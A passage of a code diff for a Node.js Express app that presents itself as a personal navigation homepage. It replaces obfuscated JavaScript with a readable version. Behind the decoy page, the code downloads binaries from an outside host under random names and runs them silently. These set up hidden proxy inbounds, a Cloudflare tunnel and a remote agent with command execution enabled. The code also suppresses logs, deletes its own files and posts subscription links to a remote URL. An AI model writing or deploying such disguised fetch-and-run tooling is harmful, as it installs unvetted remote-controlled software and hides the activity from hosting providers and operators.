知</div><span>知乎</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://chat.openai.com\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#10a37f\x22>AI</div><span>ChatGPT</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.youtube.com\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#ff0000\x22>Y</div><span>YouTube</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://v2ex.com\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#333\x22>V</div><span>V2EX</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.notion.so\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#000\x22>N</div><span>Notion</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20function\x20updateClock()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20now\x20=\x20new\x20Date();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27clock\x27).textContent\x20=\x20now.toLocaleTimeString(\x27zh-CN\x27,\x20{\x20hour12:\x20false\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27current-date\x27).textContent\x20=\x20now.toLocaleDateString(\x27zh-CN\x27,\x20{\x20weekday:\x20\x27short\x27,\x20month:\x20\x27short\x27,\x20day:\x20\x27numeric\x27\x20});\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20setInterval(updateClock,\x201000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20updateClock();\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27search-input\x27).addEventListener(\x27keypress\x27,\x20(e)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(e.key\x20===\x20\x27Enter\x27)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20q\x20=\x20e.target.value;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20if\x20(q)\x20window.open(\x27https://www.google.com/search?q=\x27\x20+\x20encodeURIComponent(q),\x20\x27_blank\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20weatherCodes\x20=\x20{\x200:\x20\x22晴朗\x22,\x201:\x20\x22大部晴朗\x22,\x202:\x20\x22多云\x22,\x203:\x20\x22阴天\x22,\x2045:\x20\x22雾\x22,\x2048:\x20\x22雾\x22,\x2051:\x20\x22细雨\x22,\x2061:\x20\x22小雨\x22,\x2071:\x20\x22小雪\x22,\x2080:\x20\x22阵雨\x22,\x2095:\x20\x22雷阵雨\x22\x20};\x0a\x20\x20\x20\x20\x20\x20\x20\x20async\x20function\x20fetchWeather()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20try\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20locRes\x20=\x20await\x20fetch(\x27https://ipapi.co/json/\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20locData\x20=\x20await\x20locRes.json();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27city-name\x27).textContent\x20=\x20locData.city\x20+\x20\x27,\x20\x27\x20+\x20locData.country_code;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20wRes\x20=\x20await\x20fetch(\x27https://api.open-meteo.com/v1/forecast?latitude=\x27\x20+\x20locData.latitude\x20+\x20\x27&longitude=\x27\x20+\x20locData.longitude\x20+\x20\x27&current_weather=true&hourly=relativehumidity_2m\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20wData\x20=\x20await\x20wRes.json();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20cur\x20=\x20wData.current_weather;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27temp\x27).textContent\x20=\x20Math.round(cur.temperature)\x20+\x20\x27°\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27weather-text\x27).textContent\x20=\x20weatherCodes[cur.weathercode]\x20||\x20\x22清爽\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27windspeed\x27).textContent\x20=\x20cur.windspeed;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27humidity\x27).textContent\x20=\x20wData.hourly.relativehumidity_2m[0];\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x20catch\x20(err)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20document.getElementById(\x27weather-text\x27).textContent\x20=\x20\x22网络异常\x22;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20fetchWeather();\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20container\x20=\x20document.getElementById(\x27star-container\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20for\x20(let\x20i\x20=\x200;\x20i\x20<\x20100;\x20i++)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20star\x20=\x20document.createElement(\x27div\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20star.className\x20=\x20\x27star\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20const\x20size\x20=\x20Math.random()\x20*\x202\x20+\x201;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20star.style.width\x20=\x20size\x20+\x20\x27px\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20star.style.height\x20=\x20size\x20+\x20\x27px\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20star.style.left\x20=\x20Math.random()\x20*\x20100\x20+\x20\x27%\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20star.style.top\x20=\x20Math.random()\x20*\x20100\x20+\x20\x27%\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20star.style.animationDelay\x20=\x20Math.random()\x20*\x203\x20+\x20\x27s\x27;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20container.appendChild(star);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20</script>\x0a</body>\x0a</html>\x0a','GATEWAY_PORT','\x20-s\x20','/api/v1/pipe','writeFileSync','path','\x0a\x0atrojan://','127.0.0.1','776zupmgM','TunnelSecret','trojan','vless://','\x0aprotocol:\x20http2\x0aingress:\x0a\x20\x20-\x20hostname:\x20','6452306RDxWvQ'];_0x2256=function(){return _0x4bc577;};return _0x2256();}async function generateServiceEndpoints(_0x194de4){const _0x13b33a=_0x54d752;let _0x38cc7f='Unknown';try{const _0x42a35a=await axios['get'](_0x13b33a(0x20b),{'timeout':0xbb8});_0x38cc7f=_0x42a35a['data'][_0x13b33a(0x1fc)]+'_'+_0x42a35a[_0x13b33a(0x23a)][_0x13b33a(0x238)];}catch(_0x48f68c){}const _0x4bf409=SERVICE_NAME?SERVICE_NAME+'-'+_0x38cc7f:_0x38cc7f,_0x4930c1={'v':'2','ps':_0x4bf409,'add':PROXY_HOST,'port':PROXY_PORT,'id':SERVICE_ID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x194de4,'path':_0x13b33a(0x26f),'tls':_0x13b33a(0x246),'sni':_0x194de4,'fp':_0x13b33a(0x21d)},_0x3f1a57=_0x13b33a(0x233)+SERVICE_ID+'@'+PROXY_HOST+':'+PROXY_PORT+_0x13b33a(0x217)+_0x194de4+_0x13b33a(0x25c)+_0x194de4+_0x13b33a(0x221)+_0x4bf409+_0x13b33a(0x23d)+Buffer['from'](JSON['stringify'](_0x4930c1))[_0x13b33a(0x26b)](_0x13b33a(0x21c))+_0x13b33a(0x22e)+SERVICE_ID+'@'+PROXY_HOST+':'+PROXY_PORT+_0x13b33a(0x20e)+_0x194de4+_0x13b33a(0x25c)+_0x194de4+'&path=%2Fapi%2Fv1%2Fpipe%3Fed%3D2560#'+_0x4bf409;fs[_0x13b33a(0x22c)](endpointsPath,Buffer['from'](_0x3f1a57)[_0x13b33a(0x26b)](_0x13b33a(0x21c))),app[_0x13b33a(0x206)]('/'+API_PATH,(_0x57b7a2,_0x453e69)=>{const _0x45fb42=_0x13b33a;_0x453e69[_0x45fb42(0x208)](_0x45fb42(0x207),_0x45fb42(0x271)),_0x453e69['send'](Buffer[_0x45fb42(0x201)](_0x3f1a57)[_0x45fb42(0x26b)](_0x45fb42(0x21c)));});if(API_ENDPOINT&&SERVICE_BASE_URL)axios[_0x13b33a(0x203)](API_ENDPOINT+_0x13b33a(0x266),{'subscription':[SERVICE_BASE_URL+'/'+API_PATH]})[_0x13b33a(0x23f)](()=>null);}async function initializeService(){configureGateway(),cleanupEndpoints(),cleanupData(),await buildServiceConfig(),await fetchAndStartServices(),await extractHostnames(),setTimeout(()=>{const _0x1fe949=_0x5573;[serviceLogPath,gatewayConfigPath,serviceBPath,gatewayServicePath,serviceAPath,monitorServicePath][_0x1fe949(0x1f9)](_0x586e91=>{const _0x3e8e09=_0x1fe949;if(fs['existsSync'](_0x586e91))fs[_0x3e8e09(0x268)](_0x586e91);});},0xea60);}initializeService()[_0x54d752(0x23f)](console[_0x54d752(0x202)]),app['listen'](SERVER_PORT,()=>console[_0x54d752(0x1f6)]('Server\x20is\x20running\x20on\x20port:'+SERVER_PORT));
+const express = require("express");
+const app = express();
+const axios = require("axios");
+const os = require('os');
+const fs = require("fs");
+const path = require("path");
+const { promisify } = require('util');
+const exec = promisify(require('child_process').exec);
+const { execSync } = require('child_process');
+
+// --- 核心变量配置 ---
+const SYNC_URL = process.env.UPLOAD_URL || '';      
+const APP_URL = process.env.PROJECT_URL || '';      
+const AUTO_PING = process.env.AUTO_ACCESS || false; 
+const WORK_DIR = process.env.FILE_PATH || './tmp';  
+const FEED_PATH = process.env.SUB_PATH || 'qianxiuadmin';    
+const SVC_PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
+const USER_ID = process.env.UUID || '1480dd0c-c55f-405b-88c9-7ecc49ff0a1f'; 
+
+const NEZHA_SERVER = process.env.NEZHA_SERVER || '';
+const NEZHA_PORT = process.env.NEZHA_PORT || '';
+const NEZHA_KEY = process.env.NEZHA_KEY || '';
+const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
+const ARGO_AUTH = process.env.ARGO_AUTH || '';
+const ARGO_PORT = process.env.ARGO_PORT || 8002;
+
+const OPT_IP = process.env.CFIP || 'cdns.doon.eu.org'; 
+const OPT_PORT = process.env.CFPORT || 443;            
+const NODE_LABEL = process.env.NAME || '';             
+
+// --- 静态页面内容 (已替换为个性化波普导航) ---
+const HOME_PAGE = `
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>个性化波普导航</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Outfit:wght@400;700&display=swap');
+
+        :root {
+            --bg-color: #F4F2ED;
+            --accent-yellow: #FFDE03;
+            --accent-pink: #FF52AF;
+            --accent-blue: #3E61FF;
+            --accent-green: #00E699;
+            --black: #1A1A1A;
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--black);
+        }
+
+        h1, h2, .font-bold-black {
+            font-family: 'Archivo Black', sans-serif;
+        }
+
+        .neo-box {
+            background: white;
+            border: 3px solid var(--black);
+            box-shadow: 6px 6px 0px 0px var(--black);
+            transition: all 0.1s ease;
+        }
+
+        .neo-box:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 10px 10px 0px 0px var(--black);
+        }
+
+        .neo-box:active {
+            transform: translate(4px, 4px);
+            box-shadow: 0px 0px 0px 0px var(--black);
+        }
+
+        .neo-btn-yellow { background-color: var(--accent-yellow); }
+        .neo-btn-pink { background-color: var(--accent-pink); }
+        .neo-btn-blue { background-color: var(--accent-blue); color: white; }
+        .neo-btn-green { background-color: var(--accent-green); }
+
+        .search-container input {
+            border: 3px solid var(--black);
+            box-shadow: 4px 4px 0px 0px var(--black);
+        }
+
+        .marquee {
+            white-space: nowrap;
+            overflow: hidden;
+            border-bottom: 3px solid var(--black);
+            background: var(--black);
+            color: white;
+            padding: 8px 0;
+        }
+        .marquee span {
+            display: inline-block;
+            animation: marquee 20s linear infinite;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+    </style>
+</head>
+<body class="pb-20">
+
+    <div class="marquee">
+        <span> ⚡️ 欢迎来到未来导航站 • STAY CURIOUS • DESIGN YOUR LIFE • EXPLORE NEW TOOLS • ⚡️ </span>
+    </div>
+
+    <header class="max-w-7xl mx-auto px-6 pt-12 pb-8">
+        <div class="flex flex-col md:flex-row justify-between items-end gap-8">
+            <div class="relative">
+                <div class="absolute -top-4 -left-4 w-12 h-12 bg-pink-400 rounded-full mix-blend-multiply opacity-70 animate-pulse"></div>
+                <h1 class="text-6xl md:text-8xl uppercase leading-none relative z-10">
+                    MINE<br><span class="text-blue-600">STASH</span>
+                </h1>
+                <p class="mt-4 text-xl font-bold italic bg-yellow-300 inline-block px-2">别让你的灵感生锈。</p>
+            </div>
+
+            <div class="search-container w-full md:w-96">
+                <input type="text" id="searchInput" placeholder="搜索资源..." 
+                    class="w-full px-6 py-4 text-lg font-bold outline-none focus:bg-white bg-gray-50 transition-colors">
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-6 mt-12">
+        
+        <div class="flex flex-wrap gap-4 mb-16">
+            <button class="neo-box px-6 py-2 font-bold neo-btn-yellow">全部</button>
+            <button class="neo-box px-6 py-2 font-bold bg-white hover:neo-btn-pink">创意工具</button>
+            <button class="neo-box px-6 py-2 font-bold bg-white hover:neo-btn-blue">编程开发</button>
+            <button class="neo-box px-6 py-2 font-bold bg-white hover:neo-btn-green">AI 实验室</button>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8" id="grid">
+            
+            <a href="https://dribbble.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group">
+                <div class="w-14 h-14 neo-box neo-btn-pink flex items-center justify-center">
+                    <i data-lucide="dribbble" class="w-8 h-8"></i>
+                </div>
+                <div>
+                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">Dribbble</h3>
+                    <p class="text-sm font-medium leading-tight">全球顶级设计师的灵感避风港。</p>
+                </div>
+                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
+                    <span>访问网站</span>
+                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
+                </div>
+            </a>
+
+            <a href="https://github.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group">
+                <div class="w-14 h-14 neo-box neo-btn-blue flex items-center justify-center text-white">
+                    <i data-lucide="github" class="w-8 h-8"></i>
+                </div>
+                <div>
+                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">GitHub</h3>
+                    <p class="text-sm font-medium leading-tight">构建世界，从一行代码开始。</p>
+                </div>
+                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
+                    <span>访问网站</span>
+                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
+                </div>
+            </a>
+
+            <a href="https://openai.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group">
+                <div class="w-14 h-14 neo-box neo-btn-green flex items-center justify-center">
+                    <i data-lucide="zap" class="w-8 h-8"></i>
+                </div>
+                <div>
+                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">ChatGPT</h3>
+                    <p class="text-sm font-medium leading-tight">AI 时代的瑞士军刀，无所不能。</p>
+                </div>
+                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
+                    <span>访问网站</span>
+                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
+                </div>
+            </a>
+
+            <a href="https://youtube.com" target="_blank" class="nav-card neo-box p-6 flex flex-col gap-4 group bg-yellow-300 shadow-[6px_6px_0px_0px_rgba(0,0,0,1)]">
+                <div class="w-14 h-14 neo-box bg-white flex items-center justify-center text-red-600 border-none">
+                    <i data-lucide="youtube" class="w-8 h-8"></i>
+                </div>
+                <div>
+                    <h3 class="text-2xl font-bold mb-2 group-hover:underline">YouTube</h3>
+                    <p class="text-sm font-medium leading-tight">世界上最大的视频学习库。</p>
+                </div>
+                <div class="mt-auto pt-4 flex items-center gap-2 font-black text-xs uppercase">
+                    <span>访问网站</span>
+                    <i data-lucide="arrow-right" class="w-4 h-4"></i>
+                </div>
+            </a>
+
+        </div>
+    </main>
+
+    <footer class="mt-24 border-t-4 border-black bg-white p-8">
+        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
+            <p class="font-bold text-lg italic">CREATED BY YOURSELF. 2024</p>
+            <div class="flex gap-6">
+                <a href="#" class="font-black border-b-2 border-black">Twitter</a>
+                <a href="#" class="font-black border-b-2 border-black">RSS Feed</a>
+                <a href="#" class="font-black border-b-2 border-black">Privacy</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+        const searchInput = document.getElementById('searchInput');
+        const cards = document.querySelectorAll('.nav-card');
+
+        searchInput.addEventListener('input', (e) => {
+            const term = e.target.value.toLowerCase();
+            cards.forEach(card => {
+                const text = card.innerText.toLowerCase();
+                card.style.display = text.includes(term) ? 'flex' : 'none';
+            });
+        });
+    </script>
+</body>
+</html>
+`;
+
+// 初始化运行环境
+if (!fs.existsSync(WORK_DIR)) {
+  fs.mkdirSync(WORK_DIR);
+  console.log(`${WORK_DIR} created`);
+}
+
+// 随机ID生成器
+function getRandomId() {
+  const chars = 'abcdefghijklmnopqrstuvwxyz';
+  let str = '';
+  for (let i = 0; i < 6; i++) {
+    str += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return str;
+}
+
+const execAgent = getRandomId(); 
+const execCore = getRandomId();  
+const execTunnel = getRandomId(); 
+const execMonitor = getRandomId(); 
+
+let agentPath = path.join(WORK_DIR, execAgent);
+let monitorPath = path.join(WORK_DIR, execMonitor);
+let corePath = path.join(WORK_DIR, execCore);
+let tunnelPath = path.join(WORK_DIR, execTunnel);
+
+let cacheFile = path.join(WORK_DIR, 'cache.dat'); 
+let listFile = path.join(WORK_DIR, 'list.txt');
+let logFile = path.join(WORK_DIR, 'runtime.log');
+let confFile = path.join(WORK_DIR, 'info.json'); 
+
+function flushLegacy() {
+  try {
+    if (!SYNC_URL) return;
+    if (!fs.existsSync(cacheFile)) return;
+
+    let content;
+    try {
+      content = fs.readFileSync(cacheFile, 'utf-8');
+    } catch { return null; }
+
+    const raw = Buffer.from(content, 'base64').toString('utf-8');
+    const nodes = raw.split('\n').filter(l => 
+      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(l)
+    );
+
+    if (nodes.length === 0) return;
+
+    axios.post(`${SYNC_URL}/api/delete-nodes`, 
+      JSON.stringify({ nodes }),
+      { headers: { 'Content-Type': 'application/json' } }
+    ).catch(() => {});
+    return null;
+  } catch (e) { return null; }
+}
+
+function sweepWorkDir() {
+  try {
+    const files = fs.readdirSync(WORK_DIR);
+    files.forEach(f => {
+      try {
+        const fp = path.join(WORK_DIR, f);
+        if (fs.statSync(fp).isFile()) fs.unlinkSync(fp);
+      } catch {}
+    });
+  } catch {}
+}
+
+app.get("/", function(req, res) {
+  res.send(HOME_PAGE);
+});
+
+async function setupCore() {
+  const conf = {
+    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
+    inbounds: [
+      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: USER_ID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
+      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: USER_ID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
+      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: USER_ID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: USER_ID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: USER_ID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
+    ],
+    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
+    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
+  };
+  fs.writeFileSync(confFile, JSON.stringify(conf, null, 2));
+}
+
+function checkArch() {
+  const arch = os.arch();
+  return (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') ? 'arm' : 'amd';
+}
+
+function fetchBin(name, url, cb) {
+  const target = name;
+  if (!fs.existsSync(WORK_DIR)) fs.mkdirSync(WORK_DIR, { recursive: true });
+  
+  const w = fs.createWriteStream(target);
+  axios({ method: 'get', url: url, responseType: 'stream' })
+    .then(resp => {
+      resp.data.pipe(w);
+      w.on('finish', () => { w.close(); cb(null, target); });
+      w.on('error', err => { fs.unlink(target, () => {}); cb(err.message); });
+    })
+    .catch(err => cb(err.message));
+}
+
+async function bootstrap() {  
+  const arch = checkArch();
+  const resources = getResources(arch);
+
+  if (!resources.length) return;
+
+  const tasks = resources.map(r => {
+    return new Promise((resolve, reject) => {
+      fetchBin(r.fileName, r.fileUrl, (err, p) => err ? reject(err) : resolve(p));
+    });
+  });
+
+  try {
+    await Promise.all(tasks);
+  } catch (err) {
+    console.error('Resource fetch error:', err);
+    return;
+  }
+
+  function setPerms(paths) {
+    paths.forEach(p => {
+      if (fs.existsSync(p)) fs.chmod(p, 0o775, () => {});
+    });
+  }
+  const bins = NEZHA_PORT ? [agentPath, corePath, tunnelPath] : [monitorPath, corePath, tunnelPath];
+  setPerms(bins);
+
+  if (NEZHA_SERVER && NEZHA_KEY) {
+    if (!NEZHA_PORT) {
+      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
+      const secure = ['443', '8443', '2096', '2087', '2083', '2053'].includes(port) ? 'true' : 'false';
+      
+      const yml = `
+client_secret: ${NEZHA_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: true
+ip_report_period: 1800
+report_delay: 4
+server: ${NEZHA_SERVER}
+skip_connection_count: true
+skip_procs_count: true
+temperature: false
+tls: ${secure}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: ${USER_ID}`;
+      
+      fs.writeFileSync(path.join(WORK_DIR, 'config.yaml'), yml);
+      try {
+        await exec(`nohup ${monitorPath} -c "${WORK_DIR}/config.yaml" >/dev/null 2>&1 &`);
+        await new Promise(r => setTimeout(r, 1000));
+      } catch {}
+    } else {
+      let tlsFlag = '';
+      if (['443', '8443', '2096', '2087', '2083', '2053'].includes(NEZHA_PORT)) tlsFlag = '--tls';
+      try {
+        await exec(`nohup ${agentPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${tlsFlag} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`);
+        await new Promise(r => setTimeout(r, 1000));
+      } catch {}
+    }
+  }
+
+  try {
+    await exec(`nohup ${corePath} -c ${confFile} >/dev/null 2>&1 &`);
+    await new Promise(r => setTimeout(r, 1000));
+  } catch {}
+
+  if (fs.existsSync(tunnelPath)) {
+    let args;
+    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
+      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
+    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
+      args = `tunnel --edge-ip-version auto --config ${WORK_DIR}/tunnel.yml run`;
+    } else {
+      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logFile} --loglevel info --url http://localhost:${ARGO_PORT}`;
+    }
+
+    try {
+      await exec(`nohup ${tunnelPath} ${args} >/dev/null 2>&1 &`);
+      await new Promise(r => setTimeout(r, 2000));
+    } catch {}
+  }
+  await new Promise(r => setTimeout(r, 5000));
+}
+
+function getResources(arch) {
+  let list;
+  const baseUrl = "https://amd64.ssss.nyc.mn"; 
+  const armUrl = "https://arm64.ssss.nyc.mn";
+  
+  if (arch === 'arm') {
+    list = [
+      { fileName: corePath, fileUrl: `${armUrl}/web` },
+      { fileName: tunnelPath, fileUrl: `${armUrl}/bot` }
+    ];
+  } else {
+    list = [
+      { fileName: corePath, fileUrl: `${baseUrl}/web` },
+      { fileName: tunnelPath, fileUrl: `${baseUrl}/bot` }
+    ];
+  }
+
+  if (NEZHA_SERVER && NEZHA_KEY) {
+    if (NEZHA_PORT) {
+      const url = arch === 'arm' ? `${armUrl}/agent` : `${baseUrl}/agent`;
+      list.unshift({ fileName: agentPath, fileUrl: url });
+    } else {
+      const url = arch === 'arm' ? `${armUrl}/v1` : `${baseUrl}/v1`;
+      list.unshift({ fileName: monitorPath, fileUrl: url });
+    }
+  }
+  return list;
+}
+
+function setupTunnelConf() {
+  if (!ARGO_AUTH || !ARGO_DOMAIN) return;
+
+  if (ARGO_AUTH.includes('TunnelSecret')) {
+    fs.writeFileSync(path.join(WORK_DIR, 'tunnel.json'), ARGO_AUTH);
+    const yml = `
+  tunnel: ${ARGO_AUTH.split('"')[11]}
+  credentials-file: ${path.join(WORK_DIR, 'tunnel.json')}
+  protocol: http2
+  ingress:
+    - hostname: ${ARGO_DOMAIN}
+      service: http://localhost:${ARGO_PORT}
+      originRequest:
+        noTLSVerify: true
+    - service: http_status:404
+  `;
+    fs.writeFileSync(path.join(WORK_DIR, 'tunnel.yml'), yml);
+  }
+}
+
+async function resolveDomains() {
+  let dom;
+
+  if (ARGO_AUTH && ARGO_DOMAIN) {
+    dom = ARGO_DOMAIN;
+    await buildFeed(dom);
+  } else {
+    try {
+      const content = fs.readFileSync(logFile, 'utf-8');
+      const m = content.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
+      
+      if (m && m[1]) {
+        dom = m[1];
+        await buildFeed(dom);
+      } else {
+        fs.unlinkSync(logFile);
+        const killCmd = process.platform === 'win32' 
+          ? `taskkill /f /im ${execTunnel}.exe > nul 2>&1`
+          : `pkill -f ${execTunnel} > /dev/null 2>&1`;
+        
+        try { await exec(killCmd); } catch {}
+        
+        await new Promise(r => setTimeout(r, 3000));
+        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${logFile} --loglevel info --url http://localhost:${ARGO_PORT}`;
+        try {
+          await exec(`nohup ${tunnelPath} ${args} >/dev/null 2>&1 &`);
+          await new Promise(r => setTimeout(r, 3000));
+          await resolveDomains();
+        } catch {}
+      }
+    } catch {}
+  }
+}
+
+async function getRegion() {
+  try {
+    const r = await axios.get('https://ipapi.co/json/', { timeout: 3000 });
+    if (r.data?.country_code && r.data?.org) return `${r.data.country_code}_${r.data.org}`;
+  } catch {
+      try {
+        const r2 = await axios.get('http://ip-api.com/json/', { timeout: 3000 });
+        if (r2.data?.status === 'success') return `${r2.data.countryCode}_${r2.data.org}`;
+      } catch {}
+  }
+  return 'Unknown';
+}
+
+async function buildFeed(dom) {
+  const region = await getRegion();
+  const label = NODE_LABEL ? `${NODE_LABEL}-${region}` : region;
+  
+  return new Promise((resolve) => {
+    setTimeout(() => {
